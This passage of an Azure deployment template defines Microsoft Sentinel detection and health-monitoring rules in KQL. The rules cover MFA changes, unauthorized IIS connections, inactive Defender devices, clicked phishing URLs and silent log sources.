'')\n    , iff(isnotempty(OldPhoneNumber), strcat('\\nOldPhoneNumber: ', OldPhoneNumber), '')\n    , iff(isnotempty(NewPhoneNumber), strcat('\\nOldPhoneNumber: ', NewPhoneNumber), '')\n    ), '')\n    , iff(TargetResources contains 'StrongAuthenticationPhoneAppDetail', \n    strcat(\n    '\\nAuthentication Device Changed:'\n    '\\n* Old Device Names: \\n* ', strcat_array(OldAppName, '\\n* ')\n    , '\\n* New Device Name: \\n* ', strcat_array(NewAppName, '\\n* ')\n    )\n    , ''))\n| extend Object = tolower(Object)\n| join kind=inner user_names on $left.Object == $right.bv_src_user\n| extend RBAScore = 0\n| parse Object with bv_src_user_name '@' bv_src_user_domain\n| extend VictimEntity = pack_array(bv_src_user_name)\n| extend AttackerEntity = pack_array(SrcIpAddress)\n| project \n    TimeGenerated\n    , bv_src_user = SrcUsername\n    , bv_src_ip = SrcIpAddress\n    , bv_object = Object\n    , bv_object_attr = ObjAttr\n    , bv_vendor_action = OperationName\n    , bv_vendor_result=ResultDescription\n    , ResultReason\n    , OldPhoneNumber\n    , NewPhoneNumber\n    , ExtendedDescription\n    , NewValues\n    , OldValues\n    , NewApp\n    , OldApp\n    , VictimEntity\n    , AttackerEntity\n    , RBAScore\n    , bv_src_user_name\n    , bv_src_user_domain",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies MFA changes.\n\n{{ExtendedDescription}}\n\nCategory: Azure AD\ntag: Custom\nMITRE: T1078"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-2400')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-2400')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-2400: [Custom] IIS - Unauthorized Connection Monitoring",
          "description": "Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other applications with Internet accessible open sockets, such as web servers and related services.[1][2][3][4][5] Depending on the flaw being exploited this may include Exploitation for Defense Evasion.\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via Escape to Host, or take advantage of weak identity and access management policies.\n\nThis alert identifies unauthorized connections to monitored Windows IIS websites\n\nInclusions: A2400_CONFIGURATION\n\nConsiderations:\n  1. Review activity\n  2. Review security controls restricting access MITRE: T1190 Category: AzureMonitor(IIS) tag: Custom",
          "severity": "Medium",
          "enabled": true,
          "query": "let start_time = 15m;\nlet latency = 60m;\nlet end_time = now();\nW3CIISLog\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| lookup A2400_CONFIGURATION on $left.sIP == $right.Webserver\n| where isnotempty(AuthorizedIPs)\n| where set_has_element(AuthorizedIPs, cIP) == false\n| extend AttackerEntity = cIP, VictimEntity = sIP\n| extend bv_rule_version = '1.2.5184' \n| extend bv_rule_timestamp = '1713373152.4944704'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.2.5184 bv_rule_timestamp: 1713373152.4944704'\n| project TimeGenerated\n  , StartTime=TimeGenerated\n  , Src = AttackerEntity\n  , Dest = VictimEntity\n  , HTTPMethod = csMethod\n  , HTTPUserAgent = csUserAgent\n  , URIPath = csUriStem\n  , URL = csReferer\n  , HTTPReferer = csReferer\n  , HTTPStatus = scStatus\n  , SrcPort = sPort\n  , bv_rule_combined_string",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT1H15M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1190"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "IP"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other applications with Internet accessible open sockets, such as web servers and related services.[1][2][3][4][5] Depending on the flaw being exploited this may include Exploitation for Defense Evasion.\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via Escape to Host, or take advantage of weak identity and access management policies.\n\nThis alert identifies unauthorized connections to monitored Windows IIS websites\n\nInclusions: A2400_CONFIGURATION\n\nConsiderations:\n  1. Review activity\n  2. Review security controls restricting access\n\ntag: RBA\n\nCategory:IIS"
          },
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "Src"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-720')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-720')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-720: [Custom] Defender ATP Portal analytics- Inactivity timer",
          "description": "This rule generates an alert when a system in defender is reported as inactive MITRE: T1562 Category: Microsoft Defender XDR tag: Health tag: Custom",
          "severity": "Low",
          "enabled": true,
          "query": "let Reporting = ProtectionStatus\n            | where TimeGenerated between (ago(30d) .. now())\n            | where ProtectionStatus !~ 'Not Reporting'\n            | summarize LastReporting=max(TimeGenerated) by DeviceName;\n            let MaxNotReporting = ProtectionStatus\n            | where TimeGenerated between (ago(30d) .. now())\n            | where ProtectionStatus =~ 'Not Reporting'\n            | summarize LastNotReporting=max(TimeGenerated) by DeviceName;\n            Reporting\n            | join MaxNotReporting on DeviceName\n            | where LastReporting  < LastNotReporting\n            | where LastReporting < ago(A720_TIME_THRESHOLD)\n            | extend bv_rule_version = '1.0.5184'\n| extend bv_rule_timestamp = '1713373152.7525175'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.5184 bv_rule_timestamp: 1713373152.7525175'\n| project DeviceName, LastReporting, bv_rule_combined_string",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1562"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This rule generates an alert when a system in defender is reported as inactive\n\ntag: Health\ntag: Custom\n\nCategory:Azure Security Center Protection Status\n\n{{bv_rule_combined_string}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-728')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-728')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-728: [RBA] O365 - Zscaler - Zapped URL",
          "description": "Alerts on any URL that was clicked by users as per Zscaler, from the URLs marked by Defender as zapped, but defender has not zapped it on time MITRE: T1566 Category: Microsoft Defender XDR,Zscaler tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let alert_bin = 1h;\n            let time_offset = 1h; // how far back the needle should end?\n            let time_window = 1h; // how much time to look back from there?\n            let end = ago(time_offset); // latest (TimeGenerated)\n            let start = end-time_window; // earliest (TimeGenerated)\n            SecurityAlert\n            | where TimeGenerated between (start .. end)\n            | where AlertName startswith 'Email messages'\n            | extend e=parse_json(Entities)\n            | mv-expand e\n            | where isnotempty(e.['Recipient'])\n            | evaluate bag_unpack(e, columnsConflict='replace_source')\n            | where Description startswith 'Emails with phish URLs that were delivered and later removed'\n            | extend recipient= column_ifexists('Recipient','')\n            | extend Urls= column_ifexists('Urls','')\n            | where Urls != ''\n            | extend Url=parse_json(Urls)\n            | project-away Urls\n            | mv-expand Url\n            | extend Url= trim_start('https?://', tostring(Url)), DefenderTime= TimeGenerated, internetMessageId= column_ifexists('InternetMessageId','')\n            //| where tolower(Url) matches regex A728_EXCLUDED_URL_REGEX == false\n            | join kind=inner (CommonSecurityLog\n            | where TimeGenerated between (start .. end) and DeviceVendor == 'Zscaler') on $left.Url == $right.RequestURL\n            | extend ZscalerTime = TimeGenerated\n            | project RequestClientApplication, ZscalerTime, DefenderTime, RequestURL, SourceTranslatedAddress, SourceUserName, ZscalerAction=DeviceEventClassID, Subject=column_ifexists('Subject', ''), SenderIP=column_ifexists('SenderIP', ''), EmailRecipient=recipient, ConfidenceLevel, ConfidenceScore, ThreatConfidence, ThreatDetectionMethods=column_ifexists('ThreatDetectionMethods', ''), Threats=column_ifexists('Threats', ''), TimeGenerated, internetMessageId\n            | extend Dif= abs(datetime_diff('hour',DefenderTime,ZscalerTime))\n            | summarize RequestURLs=make_set(RequestURL), DefenderTime=min(DefenderTime), ZscalerTime=max(ZscalerTime), Threats=make_set(Threats), EmailRecipients=make_set(EmailRecipient) by RequestClientApplication, SourceTranslatedAddress, ZscalerSourceUserName=SourceUserName, ZscalerAction, Subject, SenderIP, ConfidenceLevel, ConfidenceScore, ThreatConfidence, tostring(ThreatDetectionMethods), bin(TimeGenerated, alert_bin), internetMessageId\n            | parse ZscalerSourceUserName with UserName '@' UserDNS",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1566"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "UserDNS"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SenderIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-567')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-567')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-567: [Custom] IIS - Silent Sites Last 24 Hours",
          "description": "This alert identifies IIS websites that had log entries in the previous 48 hours but not in the last 24 hours MITRE: T1070,T1562 Category: AzureMonitor(IIS) tag: Health tag: Custom",
          "severity": "Informational",
          "enabled": true,
          "query": "W3CIISLog\n|where TimeGenerated > ago(24h)\n| where _ResourceId matches regex A567_WHITELISTED_SUBSCRIPTIONS == false\n| where tolower(Computer) !in~ (EXCLUDE_FROM_SILENT_ALERTS)\n| extend ServerSite = strcat(Computer,'-',sSiteName)\n| where ServerSite !in~ (QUIET_IIS_SITES)\n| summarize count() by ServerSite\n| join kind=rightanti (W3CIISLog\n| where TimeGenerated > ago(48h)\n| where tolower(Computer) !in~ (EXCLUDE_FROM_SILENT_ALERTS)\n| extend ServerSite = strcat(Computer,'-',sSiteName)\n| where ServerSite !in~ (QUIET_IIS_SITES)\n| where Computer has_any(INCLUDE_IN_SILENT_ALERTS)\n| summarize count(), clientIP = make_set(cIP) by ServerSite) on ServerSite\n| extend bv_rule_version = '1.2.5184'\n| extend bv_rule_timestamp = '1713373152.6884308'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.2.5184 bv_rule_timestamp: 1713373152.6884308'\n| project ServerSite\n  , clientIP \n  , Previous24HoursCount= count_\n  , bv_rule_version\n  , bv_rule_timestamp\n  , bv_rule_combined_string",
          "queryFrequency": "P1D",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1070",
            "T1562"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies IIS websites that had log entries in the previous 48 hours but not in the last 24 hours\n\nMissing server site: {{ServerSite}}\nIP address: {{clientIP}}\ntag: Health\n\nCategory:IIS\n\n{{bv_rule_combined_string}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9091')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9091')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9091: [Health] Heartbeat - Silent - A Sentinel Log Collector has not been seen",
          "description": "This alert identifies and creates a list of Log Collectors, set in A9091_LOG_COLLECTOR_NAMES  that have not been seen within 1 hour and every three hours it has not reported in from the Heartbeat Table.\n\nThis rule will not create a new alert for a previously reported device with an open ticket.\n\nA9091_LOG_COLLECTOR_NAMES MUST be configured MITRE:  Category: Windows/Linux Machines tag: Health",
          "severity": "Informational",
          "enabled": true,
          "query": "let start_time = 1h;\nlet start_time_historical = 7d;\nlet alert_bin = 1h;\n//Get all BV-9091 Incidents from Sentinel\nlet OpenSentinelIncidents = toscalar(\n    SecurityIncident\n    | where TimeGenerated between (ago(start_time_historical) .. now())\n    | summarize arg_max(TimeGenerated, *) by IncidentNumber\n    | where Title startswith 'BV-9091:'\n    | where Status !~ 'Closed'\n    | summarize arg_max(TimeGenerated, *) by IncidentNumber\n    | summarize make_set(AlertIds)\n    );\n//Get all Computers from open BV-9091 Sentinel Incidents\nlet OpenSilentLogComputers = toscalar(SecurityAlert\n    | where SystemAlertId in (OpenSentinelIncidents)\n    | extend Computer = todynamic(tostring(parse_json(tostring(parse_json(tostring(parse_json(ExtendedProperties).[\"Custom Details\"])).Computer))[0]))\n    | summarize make_set_if(Computer, isnotempty(Computer))\n    );\n      let RecentAlerts = toscalar(SecurityAlert\n      | where TimeGenerated between (ago(1d) .. now())\n      | where AlertName startswith 'BV-9091:'\n      | extend Computer = todynamic(tostring(parse_json(tostring(parse_json(tostring(parse_json(ExtendedProperties).[\"Custom Details\"])).Computer))[0]))\n      | summarize make_set_if(Computer, isnotempty(Computer))\n    );\nHeartbeat\n| where TimeGenerated between (ago(start_time_historical) .. now())\n| where Computer in (A9091_LOG_COLLECTOR_NAMES)\n| summarize take_any(OSType) by Computer, bin(TimeGenerated, alert_bin)\n| summarize LastEventTime=arg_max(TimeGenerated, *) by Computer\n| extend TimeDiff = datetime_diff('hour', now(), LastEventTime)\n| extend DayDiff = datetime_diff('day', now(), LastEventTime)\n| extend ModHour = TimeDiff % 24\n| extend Threshold_TimeToMonitor = iff(isnotempty(A9091_CONFIGURATION[Computer]), A9091_CONFIGURATION[Computer], A9091_CONFIGURATION['Default'])\n| extend TimeDiff = datetime_diff('hour', now(), LastEventTime)\n| extend DayDiff = datetime_diff('day', now(), LastEventTime)\n| extend H_or_DayDiff = iff(Threshold_TimeToMonitor contains 'h', TimeDiff, DayDiff)\n| extend H_or_DaySuffix = iff(Threshold_TimeToMonitor contains 'h', 'Hours', 'Days')\n| extend Threshold = toint(replace_regex(tostring(Threshold_TimeToMonitor), @'[h|d]', ''))\n| where H_or_DayDiff == Threshold or H_or_DayDiff % 3 == 0 and H_or_DayDiff != 0\n| where Computer !in (OpenSilentLogComputers)\n| where Computer !in (RecentAlerts)\n| summarize\n    LastEventTime=max(LastEventTime),\n    TimeDifference=max(H_or_DayDiff),\n    Computer = make_set(Computer, 10),\n    UniqueComputers=dcount(Computer),\n    TimeSuffix=take_any(H_or_DaySuffix)\n    by OSType\n| extend Description = strcat(UniqueComputers, ' devices for ', OSType, ' have not been seen in ', TimeDifference, ' ', TimeSuffix)\n| extend ExtendedDescription = strcat(\n    'Sample Device List (limited to 10): \\n* ', strcat_array(Computer, '\\n* '),\n    iff(array_length(OpenSilentLogComputers) > 0, strcat('\\nDevices with current open tickets : \\n* ', strcat_array(OpenSilentLogComputers, '\\n* ')), '')\n    )\n| where array_length(Computer) > 0\n|extend bv_start_time = now()\n  , bv_mss_category = 'LogSource Disruption'\n  , bv_alarm_type = 'Silent Provider'\n  , bv_alarm_sub_type = 'EFD v1.0'\n  , bv_alarm_name = 'BV-9091'\n  , bv_alarm_severity = 'low'\n  , sourcetype = 'Heartbeat'\n  , bv_severity = 'low'\n  , bv_reporting_dvc = tostring(Computer)\n  , bv_end_time=LastEventTime\n| extend bv_rule_version = '1.1.5023'\n| extend bv_rule_timestamp = '1709671046.8759997'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.1.5023 bv_rule_timestamp: 1709671046.8759997'\n| project-keep\n    LastEventTime\n    , OSType\n    , Computer\n    , UniqueComputers\n    , TimeDifference\n    , TimeSuffix\n    , Description\n    , ExtendedDescription\n    , sourcetype\n    , bv*",
          "queryFrequency": "PT1H",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9091: [Health] Heartbeat - {{Description}}",
            "alertDescriptionFormat": "This alert identifies and creates a list of devices(Computers), aggregated by a OSType, that have not been seen within the specified threshold and every three days it has not reported in from the Heartbeat Table.\n\nThis rule will not create a new alert for a previously reported device with an open ticket.\n\nThresholds can be set per Device Product in A9090_CONFIGURATION\n\n{{ExtendedDescription}}\n\nCategory: Heartbeat\ntag: Health\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "Computer": "Computer"
          },
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9040')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9040')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9040: [Health] Sentinel Usage - Silent - An external datasource has not been seen in the past 30 Hours",
          "description": "This alert identifies when logs have not been seen in the past 30 hours for one or more tables as detailed in the results. MITRE:  Category: BV Connector/Health tag: Health",
          "severity": "Informational",
          "enabled": true,
          "query": "let MonitoredTables = dynamic(['CommonSecurityLog'\n, 'OfficeActivity', 'Syslog', 'W3CIISLog', 'SecurityEvent', 'Event', 'AWSCloudTrail', 'AWSGuardDuty', 'SigninLogs', 'AADNonInteractiveUserSignInLogs', 'AuditLogs', 'AzureDiagnostics']);\nlet GlobalExcludedTables = dynamic([\n    'MerakiConfigurationChanges_CL'\n    , 'SentinelDeployedPlaybooks_CL'\n    , 'SentinelDeployedAlerts_CL'\n    , 'FiregenTIvTwo_CL'\n    , 'ContainerNodeInventory_CL'\n    , 'meraki_catchall_CL'\n    , 'KubePodInventory_CL'\n    , 'KubeEvents_CL'\n    , 'DuoTelephony_CL'\n    , 'CyleraDevice_CL'\n    , 'fls_sample_log_CL'\n    , 'MerakiCloud_ConfigurationChanges_CL'\n    , 'MerakiCloud_OrgSecurityEvents_CL'\n    , 'ContainerProcess_CL'\n    , 'BV_Automation_Analysis_CL'\n    , 'BV_Automation_Enrichment_CL'\n    , 'BV_IPC_Automation_Audit_CL'\n    , 'BV_Parser_Detailed_Stats_CL'\n    , 'BV_Response_Actions_CL'\n  ]);\nlet description = (table_parameter: (*)){ \ntable_parameter\n| extend all_data = pack_all(false)\n| extend keys = bag_keys(all_data)\n| mv-apply k = keys to typeof(string) on (\n    extend dynamic_entity = parse_json(all_data[k])\n    | extend ExtendedDescription = iff((k startswith 'bv_' or k startswith 'sourcetype') and k != 'bv_raw',strcat(\n    case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n    , strcat(k,': ', all_data[k])\n    )\n    ),'')\n    | summarize ExtendedDescription = make_set(ExtendedDescription), k = make_set(k)\n)\n| extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet logsource_lookBack = 8d;\nlet generated_lookback = 7d;\nlet PreviousAlerts = toscalar(\n    SecurityAlert\n    | where TimeGenerated between (ago(3d) .. now())\n    | where AlertName startswith 'BV-9040'\n    | extend DataType = tostring(parse_json(tostring(parse_json(tostring(parse_json(ExtendedProperties).['Custom Details'])).DataType))[0])\n    | summarize DataType = make_set(DataType)\n    | where isnotempty(DataType)\n);\nlet PreviousLogSources = toscalar(\n    Usage\n    | where TimeGenerated between (ago(logsource_lookBack) .. ago(generated_lookback))\n    | where IsBillable == true\n    | summarize make_set(DataType)\n);\nUsage\n| where TimeGenerated between (ago(generated_lookback) .. now())\n| where DataType has_any (MonitoredTables) or DataType contains 'ASim'\n| where DataType !in~ (GlobalExcludedTables)\n| where DataType !in~ (A9040_EXCLUDED_TABLES)\n| where IsBillable == true\n| where DataType in~ (PreviousLogSources)\n| where DataType !in (PreviousAlerts)\n| extend bv_rule_version = '1.6.5339'\n| extend bv_rule_timestamp = '1718120695.5851061'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.6.5339 bv_rule_timestamp: 1718120695.5851061'\n| project TimeGenerated, DataType, Quantity\n| summarize SumQuantity=sum(Quantity) by DataType, TimeGenerated, DailyMB=Quantity\n| summarize LastEventTime=arg_max(TimeGenerated, *), MaxMB=max(SumQuantity), AvgMB=avg(SumQuantity) by DataType\n| extend PercentChange = strcat(tostring(round((DailyMB-AvgMB)/AvgMB*100,2)),'%')\n| extend TimeDiff = datetime_diff('hour',now(), LastEventTime)\n| extend DayDiff = datetime_diff('day',now(), LastEventTime)\n| extend ModHour = TimeDiff % 24\n| extend Threshold_TimeToMonitor = iff(isnotempty(LOGSOURCE_TIMETOMONITOR[DataType]), LOGSOURCE_TIMETOMONITOR[DataType], LOGSOURCE_TIMETOMONITOR['Default'])\n| extend H_or_DayDiff = iff(Threshold_TimeToMonitor contains 'h', TimeDiff, DayDiff)\n| extend H_or_DaySuffix = iff(Threshold_TimeToMonitor contains 'h', 'Hours', 'Days')\n| extend Threshold = toint(replace_regex(tostring(Threshold_TimeToMonitor), @'[h|d]', ''))\n| where H_or_DayDiff >= Threshold\n| extend CustomerTable = iff(DataType in (A9040_CUSTOMER_TABLES), true, false)\n| extend Tags = 'tag: Health'\n| extend DataTable = DataType\n| extend AlertName = strcat('BV-9040: [Health] Silent Logs - Events in table ', DataTable ,' have not been seen in ', Threshold, ' ', H_or_DaySuffix)\n//| project-away H_or_DaySuffix, DataType\n| extend ExtendedDescription=strcat('Data table ', DataTable, ' has not been seen for at least ', Threshold_TimeToMonitor)\n| extend sourcetype = DataTable\n//| extend bv_alarm_type = 'EFD'\n//| extend bv_alarm_sub_type = 'Silent Logs'\n|extend bv_end_time = LastEventTime\n|extend bv_alarm_threshold = Threshold_TimeToMonitor\n|extend bv_alarm_value = strcat(H_or_DayDiff,H_or_DaySuffix)\n|extend bv_mss_category = 'LogSource Disruption'\n  , bv_alarm_type = 'Silent Log'\n  , bv_alarm_sub_type = 'EFD v1.0'\n  , bv_alarm_name = 'BV-9040'\n| invoke description()\n| extend bv_rule_version = '1.6.5339'\n| extend bv_rule_timestamp = '1718120695.5851061'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.6.5339 bv_rule_timestamp: 1718120695.5851061'\n| project-keep bv_end_time \n  , bv_*\n  , DailyMB\n  , SumQuantity\n  , MaxMB\n  , AvgMB\n  , PercentChange\n  , TimeDiff\n  , DayDiff\n  , ModHour\n  , bv_alarm_threshold \n  , bv_alarm_value\n  , H_or_DayDiff\n  , Threshold\n  , CustomerTable\n  , Tags\n  , DataTable \n  , AlertName\n  , ExtendedDescription\n  , bv_alarm_sub_type\n  , bv_alarm_type \n  , sourcetype\n  , bv_rule_combined_string",
          "queryFrequency": "PT2H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "{{AlertName}}",
            "alertDescriptionFormat": "This alert identifies when logs have not been seen in the past {{bv_alarm_threshold}} for one or more tables as detailed in the results. {{ExtendedDescription}} Category: Sentinel Usage {{Tags}}"
          },
          "customDetails": {
            "DataType": "DataTable"
          },
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9013')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9013')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9013: [Health] - BV Collector - Rsyslog Queue Size Issue",
          "description": "This alert identifies when a BV collector has an rsyslog queue size that has increased by over 1 MB MITRE:  Category: BV Connector/Health tag: Health",
          "severity": "Medium",
          "enabled": true,
